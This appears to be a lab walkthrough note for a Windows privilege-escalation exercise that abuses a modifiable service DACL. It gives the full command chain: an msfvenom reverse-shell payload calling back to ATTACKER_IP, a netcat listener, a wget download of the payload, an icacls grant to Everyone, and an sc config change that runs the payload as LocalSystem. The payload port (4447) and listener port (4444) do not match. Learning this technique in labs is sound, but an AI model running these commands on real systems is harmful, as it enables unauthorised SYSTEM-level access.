Even if the service's executable is secure and properly quoted, ***you can still exploit it if the service DACL lets you modify its configuration***. This allows you to ***point the service to any executable*** and run it as SYSTEM.

**Use `Accesschk` tool from `Sysinternal` suite to check for the Service DACL**
```
accesschk64.exe -qlc thmservice
```
- `SERVICE_ALL_ACCESS:` Users with this access can reconfigure the service.

**Create a Payload**
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
```

**Setup a Listener**
```
nc -nvlp 4444
```

**Transfer the Executable to Victim**
```
# Attacker
python3 -m http.server

# Victim
wget http://ATTACKER_IP:8000/rev-svc3.exe -O rev-svc3.exe
```

**Grant Permission to Everyone to Execute the Payload**
```
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

**Change the Service's associated Executable and Account**
```
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

**Restart the Service**
```
sc stop THMService 
sc start THMService
```